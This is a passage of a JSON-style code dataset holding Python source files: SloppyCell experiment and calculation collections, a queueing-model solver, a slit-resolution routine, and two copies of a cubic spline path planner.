np.meshgrid(qx_calc, qy_calc)]\n        self.qx_calc, self.qy_calc = qx_calc, qy_calc\n        self.nx, self.ny = len(qx_calc), len(qy_calc)\n        self.dy = 2*qy_width/self.ny\n\n        # Build weight matrix for resolution integration\n        if np.any(qx_width > 0):\n            self.weights = resolution.pinhole_resolution(\n                qx_calc, q, np.maximum(qx_width, resolution.MINIMUM_RESOLUTION))\n        elif len(qx_calc) == len(q) and np.all(qx_calc == q):\n            self.weights = None\n        else:\n            raise ValueError(\"Slit2D fails with q_calc != q\")\n\n    def apply(self, theory):\n        Iq = np.trapz(theory.reshape(self.ny, self.nx), axis=0, x=self.qy_calc)\n        if self.weights is not None:\n            Iq = resolution.apply_resolution_matrix(self.weights, Iq)\n        return Iq\n", "151": "import logging\nlogger = logging.getLogger('Collections')\n\nimport sets, copy\n\nimport scipy\n\nimport SloppyCell\nimport SloppyCell.Utility as Utility\nimport SloppyCell.KeyedList_mod as KeyedList_mod\nKeyedList = KeyedList_mod.KeyedList\n\nif SloppyCell.HAVE_PYPAR:\n    import pypar\n\nclass ExperimentCollection(dict):\n    \"\"\"\n    ExperimentCollection(experiment name list)\n\n    An ExperimentCollection unites a collection of experiments. For now, it's\n    most important function is to collect group the independent variables by\n    Calculation to avoid wasting computer effort redoing calculations.\n\n    Individual experiments can be accessed via dictionary-type indexing.\n    \"\"\"\n    def __init__(self, exptList = []):\n        for expt in exptList:\n            self.AddExperiment(expt)\n\n    def AddExperiment(self, expt):\n        \"\"\"\n        LoadExperiments(experiment name list)\n\n        Adds the experiments in the list to the collection\n        \"\"\"\n        if expt.GetName() in self:\n            raise ValueError(\"Experiment already has name %s\" \n                             % str(expt.GetName()))\n\n        self[expt.GetName()] = expt\n\n    def GetVarsByCalc(self):\n        \"\"\"\n        GetIndVarsByCalc() -> dictionary\n\n        Returns a dictionary of all the dependent and independent variables for \n        all the calculations required to compare with the data in all the\n        experiments. The dictionary is of the form: \n         dictionary(calculation name) -> ordered list of unique independent\n                                         variables\n        \"\"\"\n        varsByCalc = {}\n        for expt in self.values():\n            data = expt.GetData()\n\n            for calc in data:\n                varsByCalc.setdefault(calc, {})\n                for depVar in data[calc]:\n                    # Using a set is a convenient way to make sure\n                    # independent variables aren't repeated\n                    varsByCalc[calc].setdefault(depVar, sets.Set())\n                    varsByCalc[calc][depVar].\\\n                            union_update(sets.Set(data[calc][depVar].keys()))\n\n            for period in expt.GetPeriodChecks():\n                calc, depVar = period['calcKey'], period['depVarKey']\n                start, period = period['startTime'], period['period']\n                if calc not in varsByCalc.keys():\n                    varsByCalc[calc].setdefault(calc, {})\n                if depVar not in varsByCalc[calc]:\n                    varsByCalc[calc].setdefault(depVar, sets.Set())\n                varsByCalc[calc][depVar].union_update([start, start+2.0*period])\n\n            for amplitude in expt.GetAmplitudeChecks():\n                calc, depVar = amplitude['calcKey'], amplitude['depVarKey']\n                start, test, period = (amplitude['startTime'], \n                                       amplitude['testTime'], \n                                       amplitude['period'])\n                if calc not in varsByCalc.keys():\n                    varsByCalc[calc].setdefault(calc, {})\n                if depVar not in varsByCalc[calc]:\n                    varsByCalc[calc].setdefault(depVar, sets.Set())\n                varsByCalc[calc][depVar].union_update([start, start+period,\n                                                       test, test+period])\n\n            for data_set in expt.GetIntegralDataSets():\n                calc = data_set['calcKey']\n                varsByCalc.setdefault(data_set['calcKey'], {})\n                varsByCalc[calc][('full trajectory')] = data_set['interval']\n\n            for ds in expt.scaled_extrema_data:\n                calc = ds['calcKey']\n                varsByCalc.setdefault(ds['calcKey'], {})\n                if ds['type'] == 'max':\n                    called = ds['var'] + '_maximum'\n                elif ds['type'] == 'min': \n                    called = ds['var'] + '_minimum'\n                varsByCalc[calc][called] = (ds['minTime'], ds['maxTime'])\n                \n        # But I convert the sets back to sorted lists before returning\n        for calc in varsByCalc:\n            for depVar in varsByCalc[calc]:\n                varsByCalc[calc][depVar] = list(varsByCalc[calc][depVar])\n                varsByCalc[calc][depVar].sort()\n\n        return varsByCalc\n\n    def GetData(self):\n        \"\"\"\n        GetData() -> dictionary\n\n        Returns a dictionary containing all the data for the experiments. The\n        dictionary is of the form:\n         dictionary[expt name][calc name][dependent vars][independent vars]\n                 = value.\n\n        Note that value may be an arbitrary object.\n        \"\"\"\n\n        data = {}\n        for exptName, expt in self.items():\n            data[exptName] = expt.GetData()\n        \n        return data\n\nclass Experiment:\n    def __init__(self, name = '', data = {}, fixedScaleFactors = {},\n                 longName = '', shared_sf = []):\n        self.SetName(name)\n        self.SetData(data)\n        self.SetFixedScaleFactors(fixedScaleFactors)\n        self.set_shared_sf(shared_sf)\n        self.periodChecks=[]\n        self.amplitudeChecks=[]\n        self.integral_data=[]\n        self.sf_priors = {}\n        self.scaled_extrema_data = []\n\n    def _hashable_group(self, group):\n        \"\"\"\n        Return a sorted tuple of the elements of group.\n        \"\"\"\n        if isinstance(group, str):\n            group = [group]\n        hash_group = sets.Set(group)\n        hash_group = list(hash_group)\n        list(group).sort()\n        hash_group = tuple(group)\n        return hash_group\n\n    def get_sf_groups(self):\n        \"\"\"\n        Return tuples representing all the scale factors in this experiment.\n\n        A tuple will contain multiple entries if several variables share a\n        scale factor.\n        \"\"\"\n        # Get the variables measured in this experiment\n        measuredVars = sets.Set()\n        for calcId in self.data:\n            measuredVars.union_update(sets.Set(self.data[calcId].keys()))\n        for dataset in self.integral_data:\n            measuredVars.union_update(sets.Set(dataset['vars']))\n        for dataset in self.scaled_extrema_data:\n            measuredVars.add(dataset['var'])\n\n        sf_groups = [self._hashable_group(group) for group \n                     in self.get_shared_sf()]\n        # Flatten out the list of shared scale factors so we can also get\n        #  the unshared ones...\n        flattened = []\n        for g in sf_groups:\n            flattened.extend(g)\n        # These are variables that don't share scale factors\n        unshared = [self._hashable_group(var) for var in measuredVars\n                    if var not in flattened]\n        sf_groups.extend(unshared)\n        return sf_groups\n\n    def set_sf_prior(self, group, prior_type, prior_params=None):\n        \"\"\"\n        Set the type of prior to place on a given group of scalefactors.\n\n        The group contains a collection of variables that are sharing a given\n        scale factor which may be just one variable. You can see what the\n        current groups are with expt.get_sf_groups().\n\n        Currently implemented prior types are:\n            'uniform in sf': This is a uniform prior over scale factors. This\n            is simplest and fastest to compute, but it tends to weight\n            parameter sets that yield large scale factors heavily. It takes no\n            parameters.\n\n            'gaussian in log sf': This is a Gaussian prior over the logarithm\n            of the scale factor. This should avoid the problem of weighting\n            large factors heavily. It takes two parameters: the mean of the\n            normal distribution, and it's standard deviation. For example,\n            parameters (log(3.0), log(10)), will place a prior that holds 95%\n            of the probability between 3 / 10**2 and 3 * 10**2.\n        \"\"\"\n        hash_group = self._hashable_group(group)\n\n        if hash_group not in self.get_sf_groups():\n            raise ValueError('Unrecognized group to set scale factor prior on. '\n                             'If it is a shared scale factor, you need to '\n                             'specify every member of the sharing group.')\n\n        available_types = ['uniform in sf', 'gaussian in log sf']\n        if prior_type not in available_types:\n            raise ValueError('Unknown prior type %s. Available types are %s.'\n                             % (prior_type, available_types))\n        self.sf_priors[hash_group] = (prior_type, prior_params)\n\n    def compute_sf_entropy(self, sf_group, theoryDotTheory, theoryDotData, T):\n        \"\"\"\n        Compute the entropy for a given scale factor.\n        \"\"\"\n        try:\n            prior_type, prior_params = self.sf_priors[sf_group]\n        except KeyError:\n            prior_type, prior_params = 'uniform in sf', None\n\n        if prior_type == 'uniform in sf':\n            if theoryDotTheory != 0:\n                entropy = scipy.log(scipy.sqrt(2*scipy.pi*T/theoryDotTheory))\n            else:\n                entropy = 0\n        elif prior_type == 'gaussian in log sf':\n            # This is the integrand for the prior. Note that it's important\n            #  that u = 0 corresponds to B_best. This ensures that the\n            #  integration doesn't miss the (possibly sharp) peak there.\n            try:\n                import SloppyCell.misc_c\n                integrand = SloppyCell.misc_c.log_gaussian_prior_integrand\n            except ImportError:\n                logger.warn('Falling back to python integrand on log gaussian '\n                            'prior integration.')\n                exp = scipy.exp\n                def integrand(u, ak, bk, mulB, siglB, T, B_best, lB_best):\n                    B = exp(u) * B_best\n                    lB = u + lB_best\n                    ret = exp(-ak/(2*T) * (B-B_best)**2\n                              - (lB-mulB)**2/(2 * siglB**2))\n                    return ret\n\n            mulB, siglB = prior_params\n            B_best = theoryDotData/theoryDotTheory\n            lB_best = scipy.log(B_best)\n\n            # Often we get overflow errors in the integration, but they\n            #  don't actually cause a problem. (exp(-inf) is still 0.) This\n            #  prevents scipy from printing annoying error messages in this\n            #  case.\n            prev_err = scipy.seterr(over='ignore')\n            int_args = (theoryDotTheory, theoryDotData, mulB, siglB, T, B_best,\n                        lB_best)\n            ans, temp = scipy.integrate.quad(integrand, -scipy.inf, scipy.inf, \n                                             args = int_args, limit=1000)\n            scipy.seterr(**prev_err)\n            entropy = scipy.log(ans)\n        else:\n            raise ValueError('Unrecognized prior type: %s.' % prior_type)\n\n        return entropy\n        \n    def SetName(self, name):\n        self.name = name\n\n    def GetName(self):\n        return self.name\n\n    def set_data(self, data):\n        self.data = copy.copy(data)\n\n    def update_data(self, newData):\n        self.data.update(newData)\n\n    def get_data(self):\n        return self.data\n\n    def set_fixed_sf(self, fixed_sf):\n        self.fixedScaleFactors = fixed_sf\n\n    def set_shared_sf(self, shared_sf):\n        self.shared_sf = shared_sf\n\n    def get_shared_sf(self):\n        return self.shared_sf\n\n    def get_fixed_sf(self):\n        return self.fixedScaleFactors\n\n\n    SetData = set_data\n    GetData = get_data\n    UpdateData = update_data\n    SetFixedScaleFactors = set_fixed_sf\n    GetFixedScaleFactors = get_fixed_sf\n\n    def AddPeriodCheck(self, calcKey, chemical, period, sigma, startTime=0.0):\n        \"\"\"\n        Constrain the period of the oscillations to a value (period)\n        with the error (sigma). The period is found using the maximum\n        to maximum distance of the first two maxima found between\n        startTime and two periods after the startTime.\n        \"\"\"\n        self.periodChecks.append({'calcKey':calcKey, 'depVarKey':chemical,\n                                  'period': period, 'sigma': sigma, \n                                  'startTime': startTime})\n\n    def GetPeriodChecks(self):\n        return self.periodChecks\n\n    def AddAmplitudeCheck(self, calcKey, chemical, startTime, testTime, period,\n                          sigma):\n        \"\"\"\n        Turn on applying a constraint that the integrated\n        area in two different parts of the plot should be the\n        same. startTime and testTime are the starting points to\n        begin the integration for the period-long each.\n        \"\"\"\n        self.amplitudeChecks.append({'calcKey': calcKey, 'depVarKey': chemical,\n                                     'startTime': startTime, \n                                     'testTime': testTime,\n                                     'period': period, 'sigma': sigma})\n\n    def GetAmplitudeChecks(self):\n        return self.amplitudeChecks\n\n    def GetIntegralDataSets(self):\n        return self.integral_data\n\n    def add_integral_data(self, calcKey, traj, uncert_traj, vars, \n                          interval=None):\n        \"\"\"\n        Add an integral data set to the experiment.\n\n        calcKey      The id of the calculation this data corresponds to\n        traj         The trajectory to compare against\n        uncert_traj  A trajectory of data uncertainties\n        vars         What variables to fit against\n        interval     The time interval to fit over, defaults to the entire traj\n        \"\"\"\n        traj.build_interpolated_traj()\n        uncert_traj.build_interpolated_traj()\n        if interval is None:\n            interval = (traj.get_times()[0], traj.get_times()[-1])\n        self.integral_data.append({'calcKey': calcKey, 'trajectory': traj,\n                                   'uncert_traj': uncert_traj, 'vars': vars,\n                                   'interval': interval})\n\n    def add_scaled_max(self, calcKey, var, maxval, sigma, \n                           minTime=None, maxTime=None):\n        self.scaled_extrema_data.append({'calcKey': calcKey, 'var':var,\n                                         'val':maxval, 'sigma':sigma,\n                                         'minTime': minTime, 'maxTime':maxTime,\n                                         'type':'max'})\n    def add_scaled_min(self, calcKey, var, minval, sigma, \n                           minTime=None, maxTime=None):\n        self.scaled_extrema_data.append({'calcKey': calcKey, 'var':var,\n                                         'val':minval, 'sigma':sigma,\n                                         'minTime': minTime, 'maxTime':maxTime,\n                                         'type':'min'})\n\nclass CalculationCollection(KeyedList):\n    \"\"\"\n    CalculationCollection(calculation name list)\n\n    An CalculationCollection unites a collection of calculations. It is\n    responsible for generating a master list of parameters and passing each\n    Calculation its appropriate parameters.\n\n    Individual calculations can be accessed via dictionary-type indexing.\n    \n    XXX: Note that the parameter shuffling has not been extensively tested.\n    \"\"\"\n\n    def __init__(self, calcList = []):\n        KeyedList.__init__(self)\n\n        self.params = KeyedList()\n        for calc in calcList:\n            try:\n                if len(calc) == 2:\n                    self.AddCalculation(calc[1])\n                else:\n                    raise ValueError('Incorrect form for calcList')\n            except:\n                self.AddCalculation(calc)\n\n    def AddCalculation(self, calc):\n        \"\"\"\n        LoadCalculations(calculations name list)\n\n        Adds the calculations in the list to the collection and adds their\n        parameters to the parameterSet\n        \"\"\"\n        if calc.GetName() in self:\n            raise ValueError(\"Calculation already has name %s\" \n                             % str(calc.GetName()))\n\n        self.set(calc.GetName(), calc )\n        for pName, pValue in calc.GetParameters().items():\n            self.params.setdefault(pName, pValue)\n\n    def Calculate(self, varsByCalc, params = None):\n        \"\"\"\n        Calculate model predictions for everything in varsByCalc.\n\n        varsByCalc is a dictionary of the form:\n            dict[calc name][dep var] = ind var\n        \n        The return dictionary is of the form:\n            dictionary[calc name][dep var][ind var] = result\n        \"\"\"\n        if params is not None:\n            self.params.update(params)\n\n        results = {}\n\n        calcs_to_do = varsByCalc.keys()\n        # Record which calculation each node is doing\n        calc_assigned = {}\n        while calcs_to_do:\n            # The number of calculations to do this round. We want to use\n            #  all the processors if possible.\n            len_this_block = min(SloppyCell.num_procs, len(calcs_to_do))\n\n            for worker in range(1, len_this_block):\n                calc = calcs_to_do.pop()\n                calc_assigned[worker] = calc\n                logger.debug('Assigning calculation %s to worker %i.'\n                             % (calc, worker))\n                command = 'Network.calculate(net, vars, params)'\n                args = {'net': self.get(calc), 'vars': varsByCalc[calc],\n                        'params': self.params}\n                pypar.send((command, args), worker)\n\n            # The master does his share here\n            calc = calcs_to_do.pop()\n            # We use the finally statement because we want to ensure that we\n            #  *always* wait for replies from the workers, even if the master\n            #  encounters an exception in his evaluation.\n            try:\n                results[calc] = self.get(calc).calculate(varsByCalc[calc], \n                                                         self.params)\n            finally:\n                # Collect results from the workers\n                for worker in range(1, len_this_block):\n                    logger.debug('Receiving result from worker %i.' % worker)\n                    results[calc_assigned[worker]] = pypar.receive(worker)\n                # If the master encounts an exception, we'll break out of the\n                #  function ***here***\n\n            # Check the results we received. If any is a SloppyCellException, \n            #  reraise it.\n            for val in results.values():\n                if isinstance(val, Utility.SloppyCellException):\n                    raise val\n\n        return results\n\n    def CalculateSensitivity(self, varsByCalc, params = None):\n        \"\"\"\n        Calculate sensitivities for model predictions of everything in \n        varsByCalc.\n\n        varsByCalc is a dictionary of the form:\n            dict[calc name][dep var] = ind var\n        \n        The return dictionary is of the form:\n            dictionary[calc name][dep var][ind var][param] = result\n        \"\"\"\n        if params is not None :\n            self.params.update(params)\n\t\t\n        calcSensVals, calcVals = {}, {}\n        for (calcName, vars) in varsByCalc.items():\n            calc = self.get(calcName)\n            vars = varsByCalc[calcName]\n            calcPOrder = calc.GetParameters().keys()\n            calc.CalculateSensitivity(varsByCalc[calcName], self.params)\n            calcSensVals[calcName] = calc.GetSensitivityResult(vars)\n            calcVals[calcName] = calc.GetResult(vars)\n\n        return calcVals, calcSensVals\n\n    def GetParameters(self):\n        \"\"\"\n        Return a deep copy of the collections parameter KeyedList.\n        \"\"\"\n        self.params = KeyedList()\n        for calc in self.values():\n            for pName, pValue in calc.GetParameters().items():\n                self.params.setdefault(pName, pValue)\n        return self.params\n", "152": "class Derivative:\n    def __init__(self, f, h=0.0001):\n        self.f = f\n        self.h = float(h)\n\n    def __call__(self, x):\n        f, h = self.f, self.h\n        return (f(x+h) - f(x))/h\n\n\nclass Solver:\n\n    def __init__(self, a, b, g, infin=10):\n        assert 0 < a < 1 and 0 < b < 1 and 0 < g < 1\n        self.a = a\n        self.b = b\n        self.g = g\n        self.inA = 1 - a\n        self.inB = 1 - b\n        self.inG = 1 - g\n        self.q0 = [1]\n        self.q1 = [a / (self.inA * b)]\n        self.rho = a / b\n        self.P1 = self.rho\n        self.P0 = 1 - self.rho\n        self.inf = infin\n\n    def reload(self, a, b, g, infin=10):\n        assert 0 < a < 1 and 0 < b < 1 and 0 < g < 1\n        self.a = a\n        self.b = b\n        self.g = g\n        self.inA = 1 - a\n        self.inB = 1 - b\n        self.inG = 1 - g\n        self.q0 = [1]\n        self.q1 = [a / (self.inA * b)]\n        self.rho = a / b\n        self.P1 = self.rho\n        self.P0 = 1 - self.rho\n        self.inf = infin\n    # -------------------------1st-----------------\n\n    def calc_q0(self, i):\n        assert i >= 0\n        if len(self.q0) <= i:\n            # for k in range(len(self.q0), i):\n            while len(self.q0) < i+ 1:\n                self.q0.append(None)\n        if self.q0[i]:\n            return self.q0[i]\n        else:\n            self.q0[i] = self.a * self.inB * self.inG ** i * self.calc_q1(i - 1) / (1 - self.inG ** i)\n            return self.q0[i]\n\n    def calc_q1(self, i):\n        assert i >= 0\n        if len(self.q1) <= i:\n            # for k in range(len(self.q1), i):\n            while len(self.q1) < i + 1:\n                self.q1.append(None)\n        if self.q1[i]:\n            return self.q1[i]\n        else:\n            self.q1[i] = self.a * self.inB * (1 - self.inA * self.inG ** i) * self.calc_q1(i - 1) / (\n                        self.inA * self.b * (1 - self.inG ** i))\n            return self.q1[i]\n\n    def calc_p00(self):\n        summ1, summ2 = 0, 0\n        for i in range(self.inf):\n            summ1 += self.calc_q0(i)\n        for i in range(self.inf):\n            summ2 += self.calc_q1(i)\n        return 1 / (summ1 + summ2)\n\n    def calc_p0i(self, i):\n        return self.calc_p00() * self.calc_q0(i)\n\n    def calc_p1i(self, i):\n        return self.calc_p00() * self.calc_q1(i)\n\n    def calc_p00_check(self):\n        mult = 1\n        for i in range(1, self.inf):\n            mult *= self.inA * (self.b - self.a * self.inB * self.inG ** i) / (\n                        self.inA * self.b - self.a * self.inB * self.inG ** i)\n        return (1 - self.rho) * (1 / mult)\n\n    def calc_pxi(self, i):\n        if i == 0:\n            return self.P0 + self.P1 * self.b\n        else:\n            return self.calc_p1i(i - 1) * self.inB\n\n    def calc_vk0(self, k, n):\n        assert n >= 0 and k >= 1\n        if k == 1:\n            return self.inA * (1 - self.inG ** (n + 1) / (n + 1))\n        elif n == 0 and k >= 2:\n            return self.a * self.calc_vk1(k - 1, 0) + self.inA * self.inG * self.calc_vk0(k - 1, 0)\n        else:\n            return self.a * self.calc_vk1(k - 1, n) + self.inA*(\n                self.inG ** (n + 1) * self.calc_vk0(k - 1, n) + n * (1 - self.inG ** (n + 1)) * self.calc_vk1(k - 1,\n                                                                                                              n - 1) / (\n                            n + 1))\n\n    def calc_vk1(self, k, n):\n        assert n >= 0 and k >= 1\n        if k == 1:\n            return self.inA * self.b * (1 - self.inG ** (n + 1) / (n + 1))\n        elif n == 0 and k >= 2:\n            return self.a * (self.inB * self.calc_vk1(k - 1, 1) + self.b * self.calc_vk1(k - 1, 0)) + \\\n                   self.inA * (self.inB * self.calc_vk1(k - 1, 0) + self.b * self.inG * self.calc_vk0(k - 1, 0))\n        else:\n            return self.a * (self.inB * self.calc_vk1(k - 1, n + 1) + self.b * self.calc_vk1(k - 1, n)) + \\\n                   self.inA * (self.inB * self.calc_vk1(k - 1, n) + self.b * self.inG ** (n + 1) * self.calc_vk0(k - 1,\n                                                                                                                 n) + \\\n                               n * self.b * (1 - self.inG ** (n + 1)) * self.calc_vk1(k - 1, n - 1) / (n + 1))\n\n    # --------------------2nd-------------------------\n\n    def calc_P0(self, z):\n        # assert 0 < z <= 1\n        mult = 1\n        for i in range(1,self.inf):\n            mult *= 1 + self.a**2*self.inB*self.inG**i*z/(self.inA*self.b - self.a*self.inB*self.inG**i*z)\n        return self.calc_p00() * mult\n\n    def calc_P1(self, z):\n        return self.a * self.calc_P0(z) / (self.inA*self.b -self.a*self.inB*z)\n\n    def calc_Q1(self):\n        df1 = Derivative(self.calc_P0)\n        df2 = Derivative(self.calc_P1)\n        return df1(1) + df2(1)\n\n    def calc_Q2(self):\n        df = Derivative(self.calc_P0)\n        return self.a**2*self.inB/(self.b*(self.b-self.a)) + self.b*df(1)/(self.b-self.a)\n\n    def calc_Q3(self):\n        sum1 = 0\n        sum2 = 0\n        for i in range(1,self.inf):\n            sum1 += i*self.calc_p0i(i)\n            sum2 += i*self.calc_p1i(i)\n        return sum1 + sum2\n\n    def calc_Qx0(self):\n        df1 = Derivative(self.calc_P0)\n        df2 = Derivative(self.calc_P1)\n        return (df1(1) + self.b*df2(1))/self.calc_pxi(0)\n\n    def calc_Qx1(self):\n        df = Derivative(self.calc_P1)\n        return self.inB*df(1)/(1-self.calc_pxi(0))\n\n    def calc_wk(self, k):\n        assert k >= 0\n        if k == 0:\n            return self.calc_pxi(0)\n        else:\n            sum1 = 0\n            for i in range(1,self.inf):\n                sum1 += self.calc_pxi(i)*self.calc_vk1(k, i-1)\n            return sum1\n\n    def calc_w(self):\n        sum1 = 0\n        for i in range(1, self.inf):\n            sum2 = 0\n            for k in range(1, self.inf):\n                sum2 += k*self.calc_vk1(k, i-1)\n            sum1 += self.calc_pxi(i) * sum2\n        return sum1\n", "153": "#!/usr/bin/env python3\n\"\"\"\nCubic spline planner\nAuthor: Atsushi Sakai(@Atsushi_twi)\n\"\"\"\nimport math\nimport numpy as np\nimport bisect\n\n\nclass Spline:\n    \"\"\"\n    Cubic Spline class\n    \"\"\"\n\n    def __init__(self, x, y):\n        self.b, self.c, self.d, self.w = [], [], [], []\n\n        self.x = x\n        self.y = y\n\n        self.nx = len(x)  # dimension of x\n        h = np.diff(x)\n\n        # calc coefficient c\n        self.a = [iy for iy in y]\n\n        # calc coefficient c\n        A = self.__calc_A(h)\n        B = self.__calc_B(h)\n        self.c = np.linalg.solve(A, B)\n        #  print(self.c1)\n\n        # calc spline coefficient b and d\n        for i in range(self.nx - 1):\n            self.d.append((self.c[i + 1] - self.c[i]) / (3.0 * h[i]))\n            tb = (self.a[i + 1] - self.a[i]) / h[i] - h[i] * \\\n                (self.c[i + 1] + 2.0 * self.c[i]) / 3.0\n            self.b.append(tb)\n\n    def calc(self, t):\n        \"\"\"\n        Calc position\n        if t is outside of the input x, return None\n        \"\"\"\n\n        if t < self.x[0]:\n            return None\n        elif t > self.x[-1]:\n            return None\n\n        i = self.__search_index(t)\n        dx = t - self.x[i]\n        result = self.a[i] + self.b[i] * dx + \\\n            self.c[i] * dx ** 2.0 + self.d[i] * dx ** 3.0\n\n        return result\n\n    def calcd(self, t):\n        \"\"\"\n        Calc first derivative\n        if t is outside of the input x, return None\n        \"\"\"\n\n        if t < self.x[0]:\n            return None\n        elif t > self.x[-1]:\n            return None\n\n        i = self.__search_index(t)\n        dx = t - self.x[i]\n        result = self.b[i] + 2.0 * self.c[i] * dx + 3.0 * self.d[i] * dx ** 2.0\n        return result\n\n    def calcdd(self, t):\n        \"\"\"\n        Calc second derivative\n        \"\"\"\n\n        if t < self.x[0]:\n            return None\n        elif t > self.x[-1]:\n            return None\n\n        i = self.__search_index(t)\n        dx = t - self.x[i]\n        result = 2.0 * self.c[i] + 6.0 * self.d[i] * dx\n        return result\n\n    def __search_index(self, x):\n        \"\"\"\n        search data segment index\n        \"\"\"\n        return bisect.bisect(self.x, x) - 1\n\n    def __calc_A(self, h):\n        \"\"\"\n        calc matrix A for spline coefficient c\n        \"\"\"\n        A = np.zeros((self.nx, self.nx))\n        A[0, 0] = 1.0\n        for i in range(self.nx - 1):\n            if i != (self.nx - 2):\n                A[i + 1, i + 1] = 2.0 * (h[i] + h[i + 1])\n            A[i + 1, i] = h[i]\n            A[i, i + 1] = h[i]\n\n        A[0, 1] = 0.0\n        A[self.nx - 1, self.nx - 2] = 0.0\n        A[self.nx - 1, self.nx - 1] = 1.0\n        #  print(A)\n        return A\n\n    def __calc_B(self, h):\n        \"\"\"\n        calc matrix B for spline coefficient c\n        \"\"\"\n        B = np.zeros(self.nx)\n        for i in range(self.nx - 2):\n            B[i + 1] = 3.0 * (self.a[i + 2] - self.a[i + 1]) / \\\n                h[i + 1] - 3.0 * (self.a[i + 1] - self.a[i]) / h[i]\n        return B\n\n\nclass Spline2D:\n    \"\"\"\n    2D Cubic Spline class\n    \"\"\"\n\n    def __init__(self, x, y):\n        self.s = self.__calc_s(x, y)\n        self.sx = Spline(self.s, x)\n        self.sy = Spline(self.s, y)\n\n    def __calc_s(self, x, y):\n        dx = np.diff(x)\n        dy = np.diff(y)\n        self.ds = np.hypot(dx, dy)\n        s = [0]\n        s.extend(np.cumsum(self.ds))\n        return s\n\n    def calc_position(self, s):\n        \"\"\"\n        calc position\n        \"\"\"\n        x = self.sx.calc(s)\n        y = self.sy.calc(s)\n\n        return x, y\n\n    def calc_curvature(self, s):\n        \"\"\"\n        calc curvature\n        \"\"\"\n        dx = self.sx.calcd(s)\n        ddx = self.sx.calcdd(s)\n        dy = self.sy.calcd(s)\n        ddy = self.sy.calcdd(s)\n        k = (ddy * dx - ddx * dy) / ((dx ** 2 + dy ** 2)**(3 / 2))\n        return k\n\n    def calc_yaw(self, s):\n        \"\"\"\n        calc yaw\n        \"\"\"\n        dx = self.sx.calcd(s)\n        dy = self.sy.calcd(s)\n        yaw = math.atan2(dy, dx)\n        return yaw\n\n\ndef calc_spline_course(x, y, ds=0.1):\n    sp = Spline2D(x, y)\n    s = list(np.arange(0, sp.s[-1], ds))\n\n    rx, ry, ryaw, rk = [], [], [], []\n    for i_s in s:\n        ix, iy = sp.calc_position(i_s)\n        rx.append(ix)\n        ry.append(iy)\n        ryaw.append(sp.calc_yaw(i_s))\n        rk.append(sp.calc_curvature(i_s))\n\n    return rx, ry, ryaw, rk, s\n", "154": "\"\"\"\nCubic spline planner\nAuthor: Atsushi Sakai(@Atsushi_twi)\n\"\"\"\nimport math\nimport numpy as np\nimport bisect\n\n\nclass Spline:\n    \"\"\"\n    Cubic Spline class\n    \"\"\"\n\n    def __init__(self, x, y):\n        self.b, self.c, self.d, self.w = [], [], [], []\n\n        self.x = x\n        self.y = y\n\n        self.nx = len(x)  # dimension of x\n        h = np.diff(x)\n\n        # calc coefficient c\n        self.a = [iy for iy in y]\n\n        # calc coefficient c\n        A = self.__calc_A(h)\n        B = self.__calc_B(h)\n        self.c = np.linalg.solve(A, B)\n        #  print(self.c1)\n\n        # calc spline coefficient b and d\n        for i in range(self.nx - 1):\n            self.d.append((self.c[i + 1] - self.c[i]) / (3.0 * h[i]))\n            tb = (self.a[i + 1] - self.a[i]) / h[i] - h[i] * \\\n                (self.c[i + 1] + 2.0 * self.c[i]) / 3.0\n            self.b.append(tb)\n\n    def calc(self, t):\n        \"\"\"\n        Calc position\n        if t is outside of the input x, return None\n        \"\"\"\n\n        if t < self.x[0]:\n            return None\n        elif t > self.x[-1]:\n            return None\n\n        i = self.__search_index(t)\n        dx = t - self.x[i]\n        result = self.a[i] + self.b[i] * dx + \\\n            self.c[i] * dx ** 2.0 + self.d[i] * dx ** 3.0\n\n        return result\n\n    def calcd(self, t):\n        \"\"\"\n        Calc first derivative\n        if t is outside of the input x, return None\n        \"\"\"\n\n        if t < self.x[0]:\n            return None\n        elif t > self.x[-1]:\n            return None\n\n        i = self.__search_index(t)\n        dx = t - self.x[i]\n        result = self.b[i] + 2.0 * self.c[i] * dx + 3.0 * self.d[i] * dx ** 2.0\n        return result\n\n    def calcdd(self, t):\n        \"\"\"\n        Calc second derivative\n        \"\"\"\n\n        if t < self.x[0]:\n            return None\n        elif t > self.x[-1]:\n            return None\n\n        i = self.__search_index(t)\n        dx = t - self.x[i]\n        result = 2.0 * self.c[i] + 6.0 * self.d[i] * dx\n        return result\n\n    def __search_index(self, x):\n        \"\"\"\n        search data segment index\n        \"\"\"\n        return bisect.bisect(self.x, x) - 1\n\n    def __calc_A(self, h):\n        \"\"\"\n        calc matrix A for spline coefficient c\n        \"\"\"\n        A = np.zeros((self.nx, self.nx))\n        A[0, 0] = 1.0\n        for i in range(self.nx - 1):\n            if i != (self.nx - 2):\n                A[i + 1, i + 1] = 2.0 * (h[i] + h[i + 1])\n            A[i + 1, i] = h[i]\n            A[i, i + 1] = h[i]\n\n        A[0, 1] = 0.0\n        A[self.nx - 1, self.nx - 2] = 0.0\n        A[self.nx - 1, self.nx - 1] = 1.0\n        #  print(A)\n        return A\n\n    def __calc_B(self, h):\n        \"\"\"\n        calc matrix B for spline coefficient c\n        \"\"\"\n        B = np.zeros(self.nx)\n        for i in range(self.nx - 2):\n            B[i + 1] = 3.0 * (self.a[i + 2] - self.a[i + 1]) / \\\n                h[i + 1] - 3.0 * (self.a[i + 1] - self.a[i]) / h[i]\n        return B\n\n\nclass Spline2D:\n    \"\"\"\n    2D Cubic Spline class\n    \"\"\"\n\n    def __init__(self, x, y):\n        self.s = self.__calc_s(x, y)\n        self.sx = Spline(self.s, x)\n        self.sy = Spline(self.s, y)\n\n    def __calc_s(self, x, y):\n        dx = np.diff(x)\n        dy = np.diff(y)\n        self.ds = np.hypot(dx, dy)\n        s = [0]\n        s.extend(np.cumsum(self.ds))\n        return s\n\n    def calc_position(self, s):\n        \"\"\"\n        calc position\n        \"\"\"\n        x = self.sx.calc(s)\n        y = self.sy.calc(s)\n\n        return x, y\n\n    def calc_curvature(self, s):\n        \"\"\"\n        calc curvature\n        \"\"\"\n        dx = self.sx.calcd(s)\n        ddx = self.sx.calcdd(s)\n        dy = self.sy.calcd(s)\n        ddy = self.sy.calcdd(s)\n        k = (ddy * dx - ddx * dy) / ((dx ** 2 + dy ** 2)**(3 / 2))\n        return k\n\n    def calc_yaw(self, s):\n        \"\"\"\n        calc yaw\n        \"\"\"\n        dx = self.sx.calcd(s)\n        dy = self.sy.calcd(s)\n        yaw = math.atan2(dy, dx)\n        return yaw\n\n\ndef calc_spline_course(x, y, ds=0.1):\n    sp = Spline2D(x, y)\n    s = list(np.arange(0, sp.s[-1], ds))\n\n    rx, ry, ryaw, rk = 